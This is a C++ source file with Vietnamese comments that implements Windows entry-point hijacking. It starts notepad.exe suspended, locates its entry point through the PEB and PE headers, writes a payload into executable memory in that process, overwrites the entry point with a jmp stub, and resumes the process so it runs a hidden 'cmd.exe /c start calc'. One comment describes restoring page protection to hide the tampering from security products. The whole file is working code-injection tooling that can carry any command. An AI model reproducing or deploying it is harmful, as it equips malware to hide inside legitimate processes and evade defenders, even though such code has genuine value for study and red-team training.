#include <windows.h>
#include <iostream>
#include <vector>
#include <string>

// 1. Định nghĩa cấu trúc dữ liệu con trỏ tuyệt đối để vận hành độc lập vị trí
typedef UINT(WINAPI* fnWinExec)(LPCSTR lpCmdLine, UINT uCmdShow);

typedef struct _THREAD_DATA {
    fnWinExec pWinExec;       // Địa chỉ tuyệt đối của hàm WinExec trên RAM
    char szCommand[32];       // Chuỗi lệnh thực thi chức năng mở máy tính
} THREAD_DATA, * PTHREAD_DATA;

// 2. Hàm chức năng độc lập vị trí sẽ gánh luồng chạy sau khi bị điều hướng
DWORD WINAPI RemoteEntryPointPayload(LPVOID lpParam) {
    PTHREAD_DATA pData = (PTHREAD_DATA)lpParam;
    if (pData && pData->pWinExec) {
        // Gọi bằng con trỏ tuyệt đối, né sạch hàng rào địa chỉ tương đối
        pData->pWinExec(pData->szCommand, SW_HIDE);
    }
    // Giữ luồng sống để tiến trình vỏ bọc không bị sụp đổ bất ngờ sau khi mở calc
    while (TRUE) {
        Sleep(1000);
    }
    return 0;
}

// Giải thuật chủ động định vị đường dẫn hệ thống thích ứng (Zero Static Buffers)
std::wstring GetActiveSystemPath(const std::wstring& exeName) {
    // Bước 1: Gọi truyền con chỉ NULL để OS tự tính kích thước vùng nhớ cần thiết
    UINT requiredSize = GetSystemDirectoryW(NULL, 0);
    if (requiredSize == 0) return L"";

    // Bước 2: Cấp phát động mảng vừa khít để hứng chuỗi
    std::vector<wchar_t> buffer(requiredSize);
    if (GetSystemDirectoryW(buffer.data(), requiredSize) == 0) return L"";

    std::wstring finalPath(buffer.data());
    finalPath += L"\\" + exeName; // Ghép toán học chuỗi tên tiến trình mục tiêu
    return finalPath;
}

int main() {
    std::cout << "====================================================" << std::endl;
    std::cout << "[*] PE 10: ENTRYPOINT HIJACKING" << std::endl;
    std::cout << "====================================================" << std::endl;

    // CHỦ ĐỘNG: Định vị động bản đồ thư mục hệ thống thực tế
    std::wstring targetExe = L"notepad.exe";
    std::wstring dynamicPath = GetActiveSystemPath(targetExe);

    if (dynamicPath.empty()) {
        std::cerr << "[-] Khong the chu dong xac dinh duong dan he thong!" << std::endl;
        return EXIT_FAILURE;
    }
    std::wcout << L"[+] Da chu dong dinh vi tien trinh vo boc: " << dynamicPath << std::endl;

    STARTUPINFOW si = { 0 };
    PROCESS_INFORMATION pi = { 0 };
    si.cb = sizeof(STARTUPINFOW);

    // ─── BƯỚC 1: KHỞI TẠO TIẾN TRÌNH VỎ BỌC Ở TRẠNG THÁI ĐÓNG BĂNG ───
    std::cout << "[*] Dang khoi tao tien trinh vo boc o trang thai dong bang..." << std::endl;
    BOOL success = CreateProcessW(
        NULL,
        const_cast<LPWSTR>(dynamicPath.c_str()),
        NULL,
        NULL,
        FALSE,
        CREATE_SUSPENDED, // Đóng băng luồng chính ngay vạch xuất phát
        NULL,
        NULL,
        &si,
        &pi
    );

    if (!success) {
        std::cerr << "[-] Failed to create suspended process! Error: " << GetLastError() << std::endl;
        std::cin.get();
        return EXIT_FAILURE;
    }
    std::cout << "[+] Tien trinh vo boc duoc tao voi PID: " << pi.dwProcessId << std::endl;

    // ─── BƯỚC 2: TRÍCH XUẤT NGỮ CẢNH VÀ ĐỊNH VỊ ENTRYPOINT TỪ XA ───
    CONTEXT context;
    context.ContextFlags = CONTEXT_FULL;
    GetThreadContext(pi.hThread, &context);

    // Đọc địa chỉ Base Address của mục tiêu từ cấu trúc PEB thông qua thanh ghi Rdx trên x64
    PVOID baseAddress = NULL;
    ReadProcessMemory(pi.hProcess, (PVOID)(context.Rdx + 0x10), &baseAddress, sizeof(PVOID), NULL);
    std::cout << "[+] Toa do Base Address cua Notepad: 0x" << std::hex << baseAddress << std::endl;

    // Phân tích thủ công cấu trúc DOS/NT Header của file trên RAM để tìm AddressOfEntryPoint
    BYTE headersBuffer[4096];
    if (!ReadProcessMemory(pi.hProcess, baseAddress, headersBuffer, sizeof(headersBuffer), NULL)) {
        std::cerr << "[-] Khong the doc PE Header tu xa!" << std::endl;
        TerminateProcess(pi.hProcess, 0);
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
        return EXIT_FAILURE;
    }

    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)headersBuffer;
    // ĐỒNG BỘ X64: Định nghĩa tường minh kiến trúc 64-bit bảo đảm tính toán toán học chuẩn xác
    PIMAGE_NT_HEADERS64 ntHeaders = (PIMAGE_NT_HEADERS64)(headersBuffer + dosHeader->e_lfanew);

    // Tính toán tọa độ ô nhớ tuyệt đối vạch xuất phát EntryPoint trên RAM của nạn nhân
    PVOID entryPointAddress = (PVOID)((ULONG_PTR)baseAddress + ntHeaders->OptionalHeader.AddressOfEntryPoint);
    std::cout << "[+] Toa do EntryPoint tuyet doi can Hijack: 0x" << std::hex << entryPointAddress << std::endl;

    // Quy trình cấp phát động thích ứng vừa vặn (Zero Static Buffers)
    SIZE_T functionSize = 500;

    // ─── BƯỚC 3: CẤP PHÁT PHÂN VÙNG NHỚ AN TOÀN CHO PAYLOAD ───
    LPVOID remoteCodeBuffer = VirtualAllocEx(pi.hProcess, NULL, functionSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    PTHREAD_DATA pRemoteData = (PTHREAD_DATA)VirtualAllocEx(pi.hProcess, NULL, sizeof(THREAD_DATA), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

    if (!remoteCodeBuffer || !pRemoteData) {
        std::cerr << "[-] VirtualAllocEx tai tien trinh dich that bai!" << std::endl;
        TerminateProcess(pi.hProcess, 0);
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
        return EXIT_FAILURE;
    }
    std::cout << "[+] Vung nho Code payload tu xa thiet lap tai: 0x" << std::hex << remoteCodeBuffer << std::endl;

    // ─── BƯỚC 4: KHỞI TẠO CON TRỎ TUYỆT ĐỐI VÀ ĐẨY SANG RAM ĐÍCH ───
    THREAD_DATA localData;
    HMODULE hKernel32 = GetModuleHandleA("kernel32.dll");
    if (hKernel32) {
        localData.pWinExec = (fnWinExec)GetProcAddress(hKernel32, "WinExec");
    }
    strcpy_s(localData.szCommand, "cmd.exe /c start calc");

    WriteProcessMemory(pi.hProcess, remoteCodeBuffer, (LPCVOID)RemoteEntryPointPayload, functionSize, NULL);
    WriteProcessMemory(pi.hProcess, pRemoteData, &localData, sizeof(THREAD_DATA), NULL);

    // ─── BƯỚC 5: LẬT QUYỀW VÀ GHI ĐÈ LỆNH NHẢY JMP STUB TẠI ENTRYPOINT ───
    DWORD oldProtect = 0;
    std::cout << "[*] Dang dung VirtualProtectEx de mo khoa vung nho EntryPoint..." << std::endl;
    if (VirtualProtectEx(pi.hProcess, entryPointAddress, 32, PAGE_EXECUTE_READWRITE, &oldProtect)) {

        // Đoạn mã máy nhảy tuyệt đối x64 bẻ hướng dòng chảy CPU đâm thẳng vào Payload của ta
        unsigned char jmpStub[] = {
            0x48, 0xB9, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // mov rcx, 0x0 (Nạp địa chỉ tham số dữ liệu tuyệt đối)
            0x48, 0xB8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // mov rax, 0x0 (Nạp địa chỉ hàm xử lý mã máy)
            0xFF, 0xE0                                                  // jmp rax
        };

        // Vá tọa độ tuyệt đối chính xác vào cấu trúc mã máy nạp RAM
        *(DWORD_PTR*)(jmpStub + 2) = (DWORD_PTR)pRemoteData;
        *(DWORD_PTR*)(jmpStub + 12) = (DWORD_PTR)remoteCodeBuffer;

        // Ghi đè trực tiếp mìn điều hướng bẻ dòng chảy CPU thẳng vào vạch xuất phát EntryPoint hợp pháp
        WriteProcessMemory(pi.hProcess, entryPointAddress, jmpStub, sizeof(jmpStub), NULL);

        // Khôi phục lại bảo vệ trang nhớ ban đầu để xóa sạch dấu vết can thiệp của giải pháp an ninh
        VirtualProtectEx(pi.hProcess, entryPointAddress, 32, oldProtect, &oldProtect);
        std::cout << "[+] Da cai dat JMP Stub dieu huong thanh cong tai EntryPoint goc!" << std::endl;
    }
    else {
        std::cerr << "[-] Khong the mo khoa trang nho EntryPoint!" << std::endl;
    }

    // ─── BƯỚC 6: RÃ ĐÔNG LUỒNG THỰC THI CHÍNH THỨC KHAI HỎA ───
    std::cout << "[*] Kich hoat ra dong (ResumeThread) de luong chinh tu dong kich no..." << std::endl;
    ResumeThread(pi.hThread);

    // Sử dụng cờ kết thúc đồng bộ, dọn dẹp triệt để Handle chống rò rỉ bộ nhớ (Memory Leak)
    std::cout << "\n[+] EntryPoint Hijacking (Active Path Custom) Successful!" << std::endl;
    std::cout << "[*] Nhan phim Enter de don dep va dong cua so..." << std::endl;
    std::cin.get();

    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
    return EXIT_SUCCESS;
}